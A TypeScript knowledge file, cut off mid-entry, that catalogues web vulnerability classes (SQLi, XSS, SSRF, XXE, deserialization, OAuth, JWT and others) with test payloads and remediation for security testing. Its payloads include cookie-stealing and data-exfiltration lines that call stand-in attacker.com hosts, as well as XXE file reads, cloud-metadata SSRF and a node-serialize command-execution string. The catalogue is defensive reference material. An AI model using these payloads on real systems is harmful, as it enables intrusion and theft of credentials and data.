/**
 * NATT MCP Knowledge — PortSwigger Security Disciplines
 *
 * Comprehensive security knowledge aligned with PortSwigger's domains:
 *  1. Web Security Learning Paths (OWASP categories + labs)
 *  2. Bug Bounty Hunting (methodology, scope, reporting)
 *  3. DevSecOps (CI/CD integration, shift-left, pipeline gates)
 *  4. Penetration Testing (methodology, scoping, evidence, reporting)
 *  5. Automated Security Testing (scanner configs, crawl rules)
 *  6. Compliance (OWASP Top 10, PCI DSS, SOC 2, GDPR, ISO 27001)
 *  7. DAST (dynamic scanning, scan profiles, CI integration)
 *
 * Reference: https://portswigger.net/web-security/learning-paths
 *            https://portswigger.net/solutions/*
 *            https://portswigger.net/burp/dast
 */

// ─────────────────────────────────────────────────────────────────────────────
//  Types
// ─────────────────────────────────────────────────────────────────────────────

export interface VulnerabilityClass {
  id: string;
  name: string;
  category: WebSecurityCategory;
  severity: "critical" | "high" | "medium" | "low" | "info";
  cwes: string[];
  owaspTopTen: string;
  description: string;
  impact: string;
  detectionMethods: DetectionMethod[];
  testCases: TestCase[];
  remediation: string[];
  references: string[];
}

export type WebSecurityCategory =
  | "injection"
  | "broken-auth"
  | "sensitive-data"
  | "xxe"
  | "broken-access"
  | "misconfig"
  | "xss"
  | "deserialization"
  | "components"
  | "logging"
  | "ssrf"
  | "request-smuggling"
  | "race-conditions"
  | "business-logic"
  | "info-disclosure"
  | "file-upload"
  | "dom-based"
  | "websocket"
  | "graphql"
  | "api-security"
  | "prototype-pollution"
  | "cors"
  | "clickjacking"
  | "csp-bypass"
  | "oauth"
  | "jwt";

export type DetectionMethod = "dast" | "sast" | "iast" | "manual" | "fuzzing" | "crawling";

export interface TestCase {
  name: string;
  technique: string;
  payloads?: string[];
  indicators: string[];
  automatable: boolean;
}

export interface BugBountyMethodology {
  phase: string;
  objective: string;
  techniques: string[];
  tools: string[];
  timeEstimate: string;
  deliverables: string[];
}

export interface DASTScanProfile {
  id: string;
  name: string;
  description: string;
  scanChecks: string[];
  crawlConfig: CrawlConfig;
  ciIntegration: CIIntegrationConfig;
  compliance: string[];
}

export interface CrawlConfig {
  maxDepth: number;
  maxPages: number;
  followRedirects: boolean;
  handleForms: boolean;
  handleJavascript: boolean;
  excludePatterns: string[];
  authentication?: AuthConfig;
}

export interface AuthConfig {
  type: "form" | "bearer" | "cookie" | "oauth2" | "basic";
  loginUrl?: string;
  credentials?: { username: string; password: string };
  tokenHeader?: string;
}

export interface CIIntegrationConfig {
  platforms: string[];
  failOnSeverity: "critical" | "high" | "medium" | "low";
  reportFormats: string[];
  maxScanDuration: string;
  baselineComparison: boolean;
}

export interface ComplianceFramework {
  id: string;
  name: string;
  version: string;
  controls: ComplianceControl[];
}

export interface ComplianceControl {
  id: string;
  name: string;
  requirement: string;
  testProcedure: string;
  evidenceRequired: string[];
  automatable: boolean;
  scanChecks: string[];
}

export interface PentestMethodology {
  phase: string;
  objective: string;
  activities: string[];
  tools: string[];
  outputs: string[];
  riskLevel: "low" | "medium" | "high";
}

// ─────────────────────────────────────────────────────────────────────────────
//  1. Web Security Learning Paths — Vulnerability Classes
// ─────────────────────────────────────────────────────────────────────────────

export const VULNERABILITY_CLASSES: VulnerabilityClass[] = [
  {
    id: "vuln-sqli",
    name: "SQL Injection",
    category: "injection",
    severity: "critical",
    cwes: ["CWE-89"],
    owaspTopTen: "A03:2021 – Injection",
    description: "Attacker injects SQL code via user-controllable input to manipulate database queries. Enables data extraction, authentication bypass, and in some cases OS command execution.",
    impact: "Full database read/write, authentication bypass, data exfiltration, potential RCE via xp_cmdshell/LOAD_FILE",
    detectionMethods: ["dast", "sast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Error-based SQLi",
        technique: "Inject SQL syntax to trigger database error messages revealing query structure",
        payloads: ["' OR 1=1--", "' UNION SELECT NULL--", "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
        indicators: ["SQL syntax error", "unclosed quotation", "ORA-", "PG::SyntaxError"],
        automatable: true,
      },
      {
        name: "Blind SQLi (Boolean)",
        technique: "Infer data by observing response differences for true/false conditions",
        payloads: ["1' AND 1=1--", "1' AND 1=2--", "1' AND SUBSTRING(@@version,1,1)='5'--"],
        indicators: ["Different response length", "Different content", "Different HTTP status"],
        automatable: true,
      },
      {
        name: "Blind SQLi (Time-based)",
        technique: "Infer data by introducing conditional time delays",
        payloads: ["1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--", "1' AND pg_sleep(5)--"],
        indicators: ["Response time > 5 seconds when true condition"],
        automatable: true,
      },
      {
        name: "UNION-based SQLi",
        technique: "Use UNION SELECT to append attacker query to original and extract data",
        payloads: ["' UNION SELECT username,password FROM users--", "' UNION SELECT NULL,NULL,NULL--"],
        indicators: ["Additional data in response", "Column count mismatch errors"],
        automatable: true,
      },
      {
        name: "Second-order SQLi",
        technique: "Inject payload via one feature, trigger in another (e.g., register → login)",
        indicators: ["Payload stored then executed in different context"],
        automatable: false,
      },
    ],
    remediation: [
      "Use parameterized queries / prepared statements exclusively",
      "Apply allow-list input validation",
      "Implement least-privilege database accounts",
      "Enable WAF rules for SQL injection patterns",
      "Escape special characters as defense-in-depth (not primary control)",
    ],
    references: ["https://portswigger.net/web-security/sql-injection", "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"],
  },
  {
    id: "vuln-xss",
    name: "Cross-Site Scripting (XSS)",
    category: "xss",
    severity: "high",
    cwes: ["CWE-79"],
    owaspTopTen: "A03:2021 – Injection",
    description: "Attacker injects malicious scripts into web pages viewed by other users. Three types: Reflected (URL params), Stored (database), DOM-based (client-side JS).",
    impact: "Session hijacking, cookie theft, keylogging, phishing, defacement, account takeover",
    detectionMethods: ["dast", "sast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Reflected XSS",
        technique: "Inject script payload in URL parameter that reflects in response",
        payloads: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>", "'-alert(1)-'"],
        indicators: ["Payload reflected unencoded in HTML response"],
        automatable: true,
      },
      {
        name: "Stored XSS",
        technique: "Submit payload via form/API that persists and renders for other users",
        payloads: ["<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"],
        indicators: ["Payload persists across requests", "Executes for different users"],
        automatable: true,
      },
      {
        name: "DOM-based XSS",
        technique: "Exploit client-side JS that uses untrusted sources (location.hash, postMessage)",
        payloads: ["#<img src=x onerror=alert(1)>", "javascript:alert(document.domain)"],
        indicators: ["Payload processed by client-side JS without server round-trip"],
        automatable: false,
      },
      {
        name: "XSS via dangerouslySetInnerHTML",
        technique: "Identify React components using dangerouslySetInnerHTML with unsanitized input",
        indicators: ["dangerouslySetInnerHTML with user-controllable content"],
        automatable: true,
      },
    ],
    remediation: [
      "Context-aware output encoding (HTML, JavaScript, URL, CSS contexts)",
      "Use Content-Security-Policy header with strict nonce-based or hash-based policy",
      "Use DOMPurify or equivalent for HTML sanitization",
      "In React: avoid dangerouslySetInnerHTML; use textContent instead of innerHTML",
      "Enable HttpOnly flag on session cookies to prevent JS access",
    ],
    references: ["https://portswigger.net/web-security/cross-site-scripting"],
  },
  {
    id: "vuln-csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    category: "broken-access",
    severity: "high",
    cwes: ["CWE-352"],
    owaspTopTen: "A01:2021 – Broken Access Control",
    description: "Attacker tricks authenticated user into performing unintended actions by exploiting the browser's automatic inclusion of cookies.",
    impact: "Unauthorized state changes: password change, email change, fund transfer, privilege escalation",
    detectionMethods: ["dast", "manual"],
    testCases: [
      {
        name: "Missing CSRF Token",
        technique: "Submit state-changing request without CSRF token and observe acceptance",
        indicators: ["Request succeeds without token", "No SameSite cookie attribute"],
        automatable: true,
      },
      {
        name: "Token Not Validated",
        technique: "Submit request with invalid/empty CSRF token",
        payloads: ["csrf_token=", "csrf_token=AAAA", "Remove csrf_token parameter entirely"],
        indicators: ["Request accepted despite invalid token"],
        automatable: true,
      },
      {
        name: "Token Not Tied to Session",
        technique: "Use CSRF token from a different session/user",
        indicators: ["Token from user A works in user B's session"],
        automatable: false,
      },
    ],
    remediation: [
      "Implement synchronizer token pattern (unique per session)",
      "Use SameSite=Strict or SameSite=Lax cookie attribute",
      "Verify Origin/Referer header",
      "Use custom request headers for API calls (XMLHttpRequest)",
      "Require re-authentication for sensitive operations",
    ],
    references: ["https://portswigger.net/web-security/csrf"],
  },
  {
    id: "vuln-ssrf",
    name: "Server-Side Request Forgery (SSRF)",
    category: "ssrf",
    severity: "critical",
    cwes: ["CWE-918"],
    owaspTopTen: "A10:2021 – SSRF",
    description: "Attacker crafts requests that make the server-side application fetch from unintended URLs, accessing internal services, cloud metadata, or performing port scanning.",
    impact: "Internal network scanning, cloud metadata theft (AWS IAM creds), internal service access, RCE via chained exploits",
    detectionMethods: ["dast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Basic SSRF",
        technique: "Supply internal URL (localhost, 127.0.0.1) in URL parameter",
        payloads: ["http://127.0.0.1/admin", "http://localhost:8080/", "http://[::1]/"],
        indicators: ["Response contains internal service content", "Different response than external URL"],
        automatable: true,
      },
      {
        name: "Cloud Metadata SSRF",
        technique: "Access cloud instance metadata endpoints",
        payloads: ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
        indicators: ["Cloud credentials or instance metadata returned"],
        automatable: true,
      },
      {
        name: "SSRF with Filter Bypass",
        technique: "Bypass allowlist/blocklist using DNS rebinding, URL encoding, or redirects",
        payloads: ["http://0x7f000001/", "http://2130706433/", "http://attacker.com/redirect?to=http://127.0.0.1/"],
        indicators: ["Internal resource accessed despite filtering"],
        automatable: true,
      },
    ],
    remediation: [
      "Validate and sanitize all user-supplied URLs",
      "Use allowlist of permitted domains/IPs",
      "Block requests to private/internal IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)",
      "Disable HTTP redirects in server-side HTTP client",
      "Use IMDSv2 (token-based) for cloud metadata access",
    ],
    references: ["https://portswigger.net/web-security/ssrf"],
  },
  {
    id: "vuln-xxe",
    name: "XML External Entity Injection",
    category: "xxe",
    severity: "critical",
    cwes: ["CWE-611"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Attacker exploits XML parsers that process external entity references to read local files, perform SSRF, or cause denial of service.",
    impact: "Local file read (/etc/passwd), SSRF, DoS (billion laughs), data exfiltration",
    detectionMethods: ["dast", "sast", "manual"],
    testCases: [
      {
        name: "Classic XXE File Read",
        technique: "Define external entity pointing to local file",
        payloads: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'],
        indicators: ["File contents in response"],
        automatable: true,
      },
      {
        name: "Blind XXE via Out-of-Band",
        technique: "Exfiltrate data via external DTD hosted on attacker server",
        payloads: ['<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>'],
        indicators: ["HTTP request to attacker server with file content"],
        automatable: true,
      },
    ],
    remediation: [
      "Disable external entity and DTD processing in XML parsers",
      "Use JSON instead of XML where possible",
      "Apply input validation on XML content",
      "Use defusedxml (Python) or equivalent safe parsers",
    ],
    references: ["https://portswigger.net/web-security/xxe"],
  },
  {
    id: "vuln-idor",
    name: "Insecure Direct Object Reference (IDOR)",
    category: "broken-access",
    severity: "high",
    cwes: ["CWE-639"],
    owaspTopTen: "A01:2021 – Broken Access Control",
    description: "Application exposes internal object references (IDs, filenames) allowing attackers to access unauthorized resources by modifying the reference value.",
    impact: "Horizontal privilege escalation, unauthorized data access, account takeover",
    detectionMethods: ["manual", "dast", "fuzzing"],
    testCases: [
      {
        name: "Sequential ID Enumeration",
        technique: "Increment/decrement numeric IDs to access other users' resources",
        payloads: ["/api/users/101", "/api/users/102", "/api/orders/1000"],
        indicators: ["Access to other users' data with modified ID"],
        automatable: true,
      },
      {
        name: "UUID Prediction",
        technique: "If UUIDs are time-based (v1), predict other resources",
        indicators: ["UUID v1 pattern in resource identifiers"],
        automatable: false,
      },
    ],
    remediation: [
      "Implement server-side authorization checks on every resource access",
      "Use indirect reference maps (per-session random tokens mapped to real IDs)",
      "Use UUIDv4 (random) instead of sequential IDs",
      "Verify resource ownership in middleware/policy layer",
    ],
    references: ["https://portswigger.net/web-security/access-control/idor"],
  },
  {
    id: "vuln-path-traversal",
    name: "Path Traversal / Directory Traversal",
    category: "broken-access",
    severity: "high",
    cwes: ["CWE-22"],
    owaspTopTen: "A01:2021 – Broken Access Control",
    description: "Attacker manipulates file paths to access files outside the intended directory using ../ sequences or absolute paths.",
    impact: "Read sensitive files (/etc/passwd, web.config), source code disclosure, credential theft",
    detectionMethods: ["dast", "sast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Basic Traversal",
        technique: "Use ../ sequences to escape web root",
        payloads: ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//etc/passwd"],
        indicators: ["File content from outside intended directory"],
        automatable: true,
      },
      {
        name: "Encoded Traversal",
        technique: "URL-encode or double-encode traversal sequences",
        payloads: ["%2e%2e%2f", "%252e%252e%252f", "..%c0%af"],
        indicators: ["Filter bypass via encoding"],
        automatable: true,
      },
    ],
    remediation: [
      "Canonicalize paths and validate against allowlist",
      "Use path.resolve() and verify result is within allowed directory",
      "Strip ../ sequences and null bytes from filenames",
      "Run application with minimal filesystem permissions",
    ],
    references: ["https://portswigger.net/web-security/file-path-traversal"],
  },
  {
    id: "vuln-request-smuggling",
    name: "HTTP Request Smuggling",
    category: "request-smuggling",
    severity: "critical",
    cwes: ["CWE-444"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Exploit discrepancies in how front-end and back-end servers parse HTTP request boundaries (Content-Length vs Transfer-Encoding) to smuggle requests.",
    impact: "Bypass security controls, cache poisoning, session hijacking, request routing manipulation",
    detectionMethods: ["manual", "dast"],
    testCases: [
      {
        name: "CL.TE Smuggling",
        technique: "Front-end uses Content-Length, back-end uses Transfer-Encoding",
        indicators: ["Timeout or different response on differential parsing"],
        automatable: false,
      },
      {
        name: "TE.CL Smuggling",
        technique: "Front-end uses Transfer-Encoding, back-end uses Content-Length",
        indicators: ["Request desync between proxy layers"],
        automatable: false,
      },
      {
        name: "H2.CL Smuggling",
        technique: "HTTP/2 to HTTP/1.1 downgrade with Content-Length manipulation",
        indicators: ["HTTP/2 front-end + HTTP/1.1 back-end"],
        automatable: false,
      },
    ],
    remediation: [
      "Normalize request parsing across all layers",
      "Disable Transfer-Encoding chunk support at proxy level if not needed",
      "Use HTTP/2 end-to-end",
      "Implement request validation at WAF layer",
    ],
    references: ["https://portswigger.net/web-security/request-smuggling"],
  },
  {
    id: "vuln-race-conditions",
    name: "Race Conditions",
    category: "race-conditions",
    severity: "high",
    cwes: ["CWE-362"],
    owaspTopTen: "A04:2021 – Insecure Design",
    description: "Exploit time-of-check to time-of-use (TOCTOU) flaws by sending multiple concurrent requests to bypass single-use constraints.",
    impact: "Discount code reuse, MFA bypass, double-spend, limit bypass, privilege escalation",
    detectionMethods: ["manual", "fuzzing"],
    testCases: [
      {
        name: "Limit Overrun",
        technique: "Send 20+ parallel requests using same discount code or coupon",
        indicators: ["Code applied multiple times", "Balance exceeds expected"],
        automatable: true,
      },
      {
        name: "TOCTOU on File Operations",
        technique: "Race between file existence check and file write",
        indicators: ["Arbitrary file write or overwrite"],
        automatable: false,
      },
    ],
    remediation: [
      "Use database-level atomic operations (SELECT FOR UPDATE, CAS)",
      "Implement pessimistic locking for critical state changes",
      "Use idempotency keys for financial operations",
      "Apply rate limiting at the application gateway",
    ],
    references: ["https://portswigger.net/web-security/race-conditions"],
  },
  {
    id: "vuln-business-logic",
    name: "Business Logic Vulnerabilities",
    category: "business-logic",
    severity: "high",
    cwes: ["CWE-840"],
    owaspTopTen: "A04:2021 – Insecure Design",
    description: "Flaws in application business rules that allow attackers to abuse legitimate functionality in unintended ways.",
    impact: "Financial fraud, workflow bypass, privilege escalation, data manipulation",
    detectionMethods: ["manual"],
    testCases: [
      {
        name: "Excessive Trust in Client-Side Controls",
        technique: "Modify hidden form fields, cookies, or client-side price values",
        indicators: ["Server accepts client-side computed values without validation"],
        automatable: false,
      },
      {
        name: "Workflow Bypass",
        technique: "Skip required steps in multi-step process by directly accessing later steps",
        indicators: ["Can reach checkout without payment", "Skip email verification"],
        automatable: false,
      },
      {
        name: "Negative Quantity / Price",
        technique: "Submit negative values in quantity or amount fields",
        payloads: ["-1", "-1000", "0"],
        indicators: ["Negative transaction resulting in credit/refund"],
        automatable: true,
      },
    ],
    remediation: [
      "Server-side validation of all business rules",
      "Enforce sequential workflow completion",
      "Validate quantity/price/amount on server (never trust client values)",
      "Log and alert on anomalous business transactions",
    ],
    references: ["https://portswigger.net/web-security/logic-flaws"],
  },
  {
    id: "vuln-cors",
    name: "CORS Misconfiguration",
    category: "cors",
    severity: "high",
    cwes: ["CWE-942"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Misconfigured Cross-Origin Resource Sharing allows attacker-controlled origins to read sensitive data from the vulnerable domain.",
    impact: "Data theft via malicious web pages, credential harvesting, API abuse",
    detectionMethods: ["dast", "manual"],
    testCases: [
      {
        name: "Reflected Origin",
        technique: "Set Origin header to attacker domain and check if it's reflected in ACAO",
        payloads: ["Origin: https://evil.com", "Origin: null"],
        indicators: ["Access-Control-Allow-Origin reflects arbitrary origin with credentials"],
        automatable: true,
      },
      {
        name: "Null Origin Allowed",
        technique: "Send Origin: null (sandbox, file://, redirects)",
        indicators: ["Access-Control-Allow-Origin: null with credentials"],
        automatable: true,
      },
    ],
    remediation: [
      "Use explicit allowlist for Access-Control-Allow-Origin (never reflect or use *)",
      "Never combine * with Access-Control-Allow-Credentials: true",
      "Validate Origin header server-side against trusted domains list",
    ],
    references: ["https://portswigger.net/web-security/cors"],
  },
  {
    id: "vuln-clickjacking",
    name: "Clickjacking",
    category: "clickjacking",
    severity: "medium",
    cwes: ["CWE-1021"],
    owaspTopTen: "A04:2021 – Insecure Design",
    description: "Attacker overlays transparent iframe of target site over a deceptive page, tricking users into clicking hidden elements.",
    impact: "Unintended actions: enabling camera, liking content, transferring funds, changing settings",
    detectionMethods: ["dast", "manual"],
    testCases: [
      {
        name: "Basic Clickjacking",
        technique: "Embed target in iframe with CSS opacity:0 overlay",
        indicators: ["Page loads in iframe without X-Frame-Options or CSP frame-ancestors"],
        automatable: true,
      },
    ],
    remediation: [
      "Set X-Frame-Options: DENY or SAMEORIGIN",
      "Use CSP frame-ancestors 'self' directive",
      "Implement frame-busting JavaScript as defense-in-depth",
    ],
    references: ["https://portswigger.net/web-security/clickjacking"],
  },
  {
    id: "vuln-websocket",
    name: "WebSocket Security Issues",
    category: "websocket",
    severity: "high",
    cwes: ["CWE-1385"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Vulnerabilities in WebSocket implementations: XSS via messages, CSWSH (cross-site WebSocket hijacking), and missing auth on upgrade.",
    impact: "Data theft, unauthorized actions, session hijacking via WebSocket connection theft",
    detectionMethods: ["manual", "dast"],
    testCases: [
      {
        name: "Cross-Site WebSocket Hijacking",
        technique: "Connect to target WebSocket from attacker page (no Origin validation)",
        indicators: ["WebSocket handshake accepts any Origin", "Uses cookies for auth"],
        automatable: true,
      },
      {
        name: "XSS via WebSocket Messages",
        technique: "Send XSS payload via WebSocket that renders in another user's view",
        payloads: ["<img src=x onerror=alert(1)>"],
        indicators: ["Message content rendered without sanitization"],
        automatable: false,
      },
    ],
    remediation: [
      "Validate Origin header on WebSocket upgrade requests",
      "Use token-based auth (not just cookies) for WebSocket connections",
      "Sanitize all WebSocket message content before rendering",
      "Implement rate limiting on WebSocket messages",
    ],
    references: ["https://portswigger.net/web-security/websockets"],
  },
  {
    id: "vuln-graphql",
    name: "GraphQL Vulnerabilities",
    category: "graphql",
    severity: "high",
    cwes: ["CWE-200"],
    owaspTopTen: "A01:2021 – Broken Access Control",
    description: "GraphQL-specific attack vectors including introspection abuse, query depth attacks, batch query abuse, and field-level authorization bypass.",
    impact: "Schema disclosure, DoS via nested queries, data leak, authorization bypass",
    detectionMethods: ["manual", "dast"],
    testCases: [
      {
        name: "Introspection Query",
        technique: "Dump full schema via __schema introspection",
        payloads: ['{__schema{types{name,fields{name,type{name}}}}}'],
        indicators: ["Full schema returned including internal types"],
        automatable: true,
      },
      {
        name: "Query Depth Attack (DoS)",
        technique: "Send deeply nested query to exhaust server resources",
        payloads: ['{user{friends{friends{friends{friends{name}}}}}}'],
        indicators: ["Server timeout or excessive memory use"],
        automatable: true,
      },
      {
        name: "Batch Query / Alias Attack",
        technique: "Use aliases to bypass rate limits (e.g., brute-force login)",
        payloads: ['{a:login(user:"admin",pass:"pass1"),b:login(user:"admin",pass:"pass2")}'],
        indicators: ["Multiple operations in single request bypass rate limiter"],
        automatable: true,
      },
    ],
    remediation: [
      "Disable introspection in production",
      "Implement query depth and complexity limits",
      "Apply field-level authorization (not just resolver-level)",
      "Rate limit by operation count, not just HTTP requests",
      "Use persisted queries / query allowlisting in production",
    ],
    references: ["https://portswigger.net/web-security/graphql"],
  },
  {
    id: "vuln-prototype-pollution",
    name: "Prototype Pollution",
    category: "prototype-pollution",
    severity: "high",
    cwes: ["CWE-1321"],
    owaspTopTen: "A03:2021 – Injection",
    description: "Attacker modifies JavaScript Object.prototype via __proto__, constructor, or prototype properties, affecting all objects in the application.",
    impact: "Property injection leading to XSS, RCE (in Node.js), authentication bypass, DoS",
    detectionMethods: ["sast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Client-side Prototype Pollution",
        technique: "Inject __proto__ via URL params or JSON merge",
        payloads: ["?__proto__[isAdmin]=true", '{"__proto__":{"isAdmin":true}}', '{"constructor":{"prototype":{"isAdmin":true}}}'],
        indicators: ["Newly created objects inherit injected property"],
        automatable: true,
      },
      {
        name: "Server-side Prototype Pollution",
        technique: "Exploit recursive merge functions (lodash.merge, deep-extend)",
        indicators: ["Object.prototype modified on server", "All responses affected"],
        automatable: false,
      },
    ],
    remediation: [
      "Freeze Object.prototype (Object.freeze(Object.prototype))",
      "Use Map instead of plain objects for key-value stores",
      "Sanitize JSON input: reject keys __proto__, constructor, prototype",
      "Use Object.create(null) for lookup tables",
      "Update libraries (lodash ≥4.17.21, etc.)",
    ],
    references: ["https://portswigger.net/web-security/prototype-pollution"],
  },
  {
    id: "vuln-deserialization",
    name: "Insecure Deserialization",
    category: "deserialization",
    severity: "critical",
    cwes: ["CWE-502"],
    owaspTopTen: "A08:2021 – Software and Data Integrity Failures",
    description: "Application deserializes untrusted data, allowing attackers to manipulate serialized objects for RCE, privilege escalation, or injection.",
    impact: "Remote code execution, authentication bypass, data tampering",
    detectionMethods: ["sast", "manual"],
    testCases: [
      {
        name: "Java Deserialization",
        technique: "Send ysoserial-generated payload to Java deserialization endpoint",
        indicators: ["Application processes serialized Java objects from untrusted input"],
        automatable: true,
      },
      {
        name: "PHP Object Injection",
        technique: "Modify serialized PHP object to trigger magic methods (__wakeup, __destruct)",
        indicators: ["PHP serialize/unserialize on user-controllable input"],
        automatable: false,
      },
      {
        name: "Node.js node-serialize RCE",
        technique: "Exploit node-serialize IIFE injection",
        payloads: ['{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}'],
        indicators: ["node-serialize library in use with untrusted input"],
        automatable: true,
      },
    ],
    remediation: [
      "Never deserialize untrusted data",
      "Use data-only formats (JSON) instead of serialization formats",
      "Implement integrity checks (HMAC) on serialized data",
      "Allowlist deserializable classes",
      "Monitor deserialization endpoints for anomalies",
    ],
    references: ["https://portswigger.net/web-security/deserialization"],
  },
  {
    id: "vuln-oauth",
    name: "OAuth 2.0 Vulnerabilities",
    category: "oauth",
    severity: "high",
    cwes: ["CWE-287"],
    owaspTopTen: "A07:2021 – Identification and Authentication Failures",
    description: "Flaws in OAuth 2.0 implementations: missing state param (CSRF), open redirect in redirect_uri, token leakage, authorization code theft.",
    impact: "Account takeover, session hijacking, unauthorized access to protected resources",
    detectionMethods: ["manual", "dast"],
    testCases: [
      {
        name: "Missing State Parameter",
        technique: "Remove state param from OAuth flow to enable CSRF",
        indicators: ["OAuth flow proceeds without state validation"],
        automatable: true,
      },
      {
        name: "Redirect URI Manipulation",
        technique: "Modify redirect_uri to steal authorization code",
        payloads: ["redirect_uri=https://evil.com/callback", "redirect_uri=https://legit.com@evil.com"],
        indicators: ["Authorization code sent to attacker-controlled redirect"],
        automatable: true,
      },
      {
        name: "Token Leakage via Referer",
        technique: "Access token in URL fragment leaks via Referer header to external resources",
        indicators: ["Token appears in URL fragment", "Page loads external resources"],
        automatable: false,
      },
    ],
    remediation: [
      "Always use and validate state parameter (unguessable, per-session)",
      "Strict redirect_uri validation (exact match, no wildcards)",
      "Use PKCE for public clients (native/SPA apps)",
      "Use authorization code flow (never implicit grant for sensitive apps)",
      "Validate token audience and issuer",
    ],
    references: ["https://portswigger.net/web-security/oauth"],
  },
  {
    id: "vuln-jwt",
    name: "JWT Vulnerabilities",
    category: "jwt",
    severity: "critical",
    cwes: ["CWE-347"],
    owaspTopTen: "A07:2021 – Identification and Authentication Failures",
    description: "Flaws in JWT implementations: algorithm confusion, none algorithm, jwk/jku injection, kid path traversal, insufficient signature validation.",
    impact: "Authentication bypass, privilege escalation, token forging",
    detectionMethods: ["manual", "dast"],
    testCases: [
      {
        name: "None Algorithm",
        technique: "Change JWT algorithm to 'none' and remove signature",
        indicators: ["Token accepted without signature verification"],
        automatable: true,
      },
      {
        name: "Algorithm Confusion (RS256→HS256)",
        technique: "Sign JWT with public key using HS256 when server expects RS256",
        indicators: ["Forged token accepted with modified algorithm"],
        automatable: true,
      },
      {
        name: "JWK Header Injection",
        technique: "Embed attacker's public key in JWT jwk header",
        indicators: ["Server uses embedded jwk for verification"],
        automatable: true,
      },
    ],
    remediation: [
      "Pin allowed algorithms in verification config (never trust JWT header)",
      "Separate key stores for symmetric/asymmetric algorithms",
      "Validate all claims: exp, nbf, iss, aud",
      "Use short-lived tokens with refresh token rotation",
      "Reject tokens with jwk/jku headers unless from trusted source",
    ],
    references: ["https://portswigger.net/web-security/jwt"],
  },
  {
    id: "vuln-file-upload",
    name: "Unrestricted File Upload",
    category: "file-upload",
    severity: "critical",
    cwes: ["CWE-434"],
    owaspTopTen: "A04:2021 – Insecure Design",
    description: "Application allows uploading files without proper validation, enabling upload of web shells, malware, or files that trigger server-side processing vulnerabilities.",
    impact: "Remote code execution via web shell, XSS via SVG/HTML, DoS, malware distribution",
    detectionMethods: ["dast", "manual", "fuzzing"],
    testCases: [
      {
        name: "Web Shell Upload",
        technique: "Upload PHP/JSP/ASPX web shell with extension bypass",
        payloads: ["shell.php", "shell.php.jpg", "shell.pHp", "shell.php%00.jpg"],
        indicators: ["Uploaded file is accessible and executable on server"],
        automatable: true,
      },
      {
        name: "SVG XSS Upload",
        technique: "Upload SVG containing JavaScript payload",
        payloads: ['<svg><script>alert(document.cookie)</script></svg>'],
        indicators: ["SVG renders with JavaScript execution"],
        automatable: true,
      },
    ],
    remediation: [
      "Validate file type by content (magic bytes), not just extension",
      "Store uploads outside web root with randomized names",
      "Serve uploaded files from a separate domain (CDN)",
      "Set Content-Disposition: attachment for downloads",
      "Scan uploads with antivirus/malware detection",
      "Enforce file size limits",
    ],
    references: ["https://portswigger.net/web-security/file-upload"],
  },
  {
    id: "vuln-api-security",
    name: "API Security Vulnerabilities (BOLA/BFLA)",
    category: "api-security",
    severity: "critical",
    cwes: ["CWE-285"],
    owaspTopTen: "A01:2021 – Broken Access Control",
    description: "API-specific vulnerabilities including Broken Object Level Authorization (BOLA), Broken Function Level Authorization (BFLA), mass assignment, and excessive data exposure.",
    impact: "Unauthorized data access, privilege escalation, data manipulation",
    detectionMethods: ["manual", "dast", "fuzzing"],
    testCases: [
      {
        name: "BOLA (Object Level)",
        technique: "Access another user's resource by changing object ID in API request",
        payloads: ["/api/v1/users/OTHER_USER_ID/profile", "/api/v1/orders/OTHER_ORDER_ID"],
        indicators: ["Access to other users' objects without authorization check"],
        automatable: true,
      },
      {
        name: "BFLA (Function Level)",
        technique: "Call admin-only API endpoints with regular user credentials",
        payloads: ["/api/v1/admin/users", "DELETE /api/v1/users/123"],
        indicators: ["Admin functions accessible to regular users"],
        automatable: true,
      },
      {
        name: "Mass Assignment",
        technique: "Add extra fields to update request (role, isAdmin, balance)",
        payloads: ['{"name":"bob","role":"admin"}', '{"balance":999999}'],
        indicators: ["Server processes unauthorized fields"],
        automatable: true,
      },
    ],
    remediation: [
      "Implement authorization checks at object level for every request",
      "Use DTOs/schema validation to reject unexpected fields (Zod, class-validator)",
      "Separate admin and user API route handlers",
      "Apply rate limiting per user per endpoint",
      "Log and alert on authorization failures",
    ],
    references: ["https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"],
  },
  {
    id: "vuln-csp-bypass",
    name: "Content Security Policy Bypass",
    category: "csp-bypass",
    severity: "medium",
    cwes: ["CWE-16"],
    owaspTopTen: "A05:2021 – Security Misconfiguration",
    description: "Bypassing CSP protections through JSONP endpoints, AngularJS sandbox escape, base element injection, or overly permissive directives.",
    impact: "XSS exploitation despite CSP, data exfiltration",
    detectionMethods: ["manual", "sast"],
    testCases: [
      {
        name: "CSP via JSONP callback",
        technique: "Abuse whitelisted domain's JSONP endpoint to execute JavaScript",
        indicators: ["CSP allows domain with JSONP endpoint", "Callback parameter reflects JS"],
        automatable: false,
      },
      {
        name: "Dangling Markup Injection",
        technique: "Inject open tag to capture page content via CSP-allowed resource",
        payloads: ['<img src="https://attacker.com/collect?data='],
